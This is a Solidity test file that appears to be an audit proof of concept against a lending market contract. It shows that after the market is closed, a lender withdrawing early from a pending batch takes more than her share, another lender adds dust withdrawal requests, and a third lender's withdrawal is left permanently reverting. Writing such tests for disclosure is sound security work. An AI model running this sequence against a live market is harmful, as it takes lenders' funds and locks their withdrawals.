// SPDX-License-Identifier: Apache-2.0
pragma solidity >=0.8.20;

import '../BaseMarketTest.sol';

contract Poc64 is BaseMarketTest {
  address internal laurence = address(1337);

  function test_poc64_closedMarketBatchOverpay() external {
    parameters.annualInterestBips = 3650;
    setUpContracts(false);

    _deposit(alice, 1e18);
    _deposit(bob, 0.5e18);
    _deposit(laurence, 0.5e18);
    fastForward(200 weeks);

    // Alice queues. Interest has accrued on the debt without being repaid, so the batch is only
    // partly paid and is still the pending batch.
    vm.prank(alice);
    uint32 expiry = market.queueFullWithdrawal();
    assertEq(market.previousState().pendingWithdrawalExpiry, expiry, 'batch pending before close');
    assertGt(market.previousState().scaledPendingWithdrawals, 0, 'batch not fully paid before close');

    // closeMarket succeeds with that unpaid batch pending: the borrower repays the debt and closeMarket
    // pays the batch in full, leaving it as the pending batch until its expiry.
    uint256 owed = market.totalDebts() - market.totalAssets();
    asset.mint(borrower, owed);
    vm.startPrank(borrower);
    asset.approve(address(market), owed);
    market.closeMarket();
    vm.stopPrank();
    assertTrue(market.previousState().isClosed, 'market closed');
    assertEq(market.previousState().scaledPendingWithdrawals, 0, 'batch fully paid by closeMarket');
    assertEq(market.previousState().pendingWithdrawalExpiry, expiry, 'batch still pending after close');
    assertLt(expiry, block.timestamp + 365 days, 'sanity');
    assertGt(expiry, block.timestamp, 'expiry is in the future');

    // Closed market: Alice executes before the batch has expiry, against a batch holding only her scaled amount.
    uint256 aliceOut = market.executeWithdrawal(alice, expiry);

    // Bob joins the same batch with many dust requests (each burns 1 scaled unit but the
    // batch is credited floor(sf) normalized units), then his full balance. Laurence joins too.
    vm.startPrank(bob);
    for (uint i; i < 50; i++) {
      assertEq(market.queueWithdrawal(2), expiry);
    }
    assertEq(market.queueFullWithdrawal(), expiry);
    vm.stopPrank();
    vm.prank(laurence);
    assertEq(market.queueFullWithdrawal(), expiry);

    WithdrawalBatch memory b = market.getWithdrawalBatch(expiry);
    assertEq(b.scaledAmountBurned, b.scaledTotalAmount, 'batch fully paid');
    uint256 aliceProRata = MathUtils.mulDiv(
      b.normalizedAmountPaid,
      market.getAccountWithdrawalStatus(alice, expiry).scaledAmount,
      b.scaledTotalAmount
    );
    uint256 bobDue = MathUtils.mulDiv(
      b.normalizedAmountPaid,
      market.getAccountWithdrawalStatus(bob, expiry).scaledAmount,
      b.scaledTotalAmount
    );
    uint256 laurenceDue = MathUtils.mulDiv(
      b.normalizedAmountPaid,
      market.getAccountWithdrawalStatus(laurence, expiry).scaledAmount,
      b.scaledTotalAmount
    );
    emit log_named_uint('batch.normalizedAmountPaid', b.normalizedAmountPaid);
    emit log_named_uint('alice received (early)', aliceOut);
    emit log_named_uint('alice pro-rata share of final batch', aliceProRata);
    emit log_named_uint('bob due', bobDue);
    emit log_named_uint('laurence due', laurenceDue);
    emit log_named_uint('sum of entitlements incl. early payout', aliceOut + bobDue + laurenceDue);

    // The invariant "sum of withdrawals <= batch.normalizedAmountPaid" is broken by Alice's early execution.
    assertGt(aliceOut, aliceProRata, 'alice withdrew more than her final pro-rata share');
    assertGt(aliceOut + bobDue + laurenceDue, b.normalizedAmountPaid, 'payouts exceed batch total');

    assertEq(market.executeWithdrawal(bob, expiry), bobDue);
    uint256 unclaimed = market.previousState().normalizedUnclaimedWithdrawals;
    emit log_named_uint('unclaimed accounting left after bob', unclaimed);
    emit log_named_uint('market asset balance', asset.balanceOf(address(market)));
    assertLt(unclaimed, laurenceDue, 'accounting short of laurence due');
    assertGt(asset.balanceOf(address(market)), laurenceDue, 'tokens are physically present');

    // Laurence's whole withdrawal (not just the shortfall) reverts on underflow, now and later.
    vm.expectRevert(abi.encodePacked(uint32(Panic_ErrorSelector), Panic_Arithmetic));
    market.executeWithdrawal(laurence, expiry);
    fastForward(365 days);
    vm.expectRevert(abi.encodePacked(uint32(Panic_ErrorSelector), Panic_Arithmetic));
    market.executeWithdrawal(laurence, expiry);
  }
}
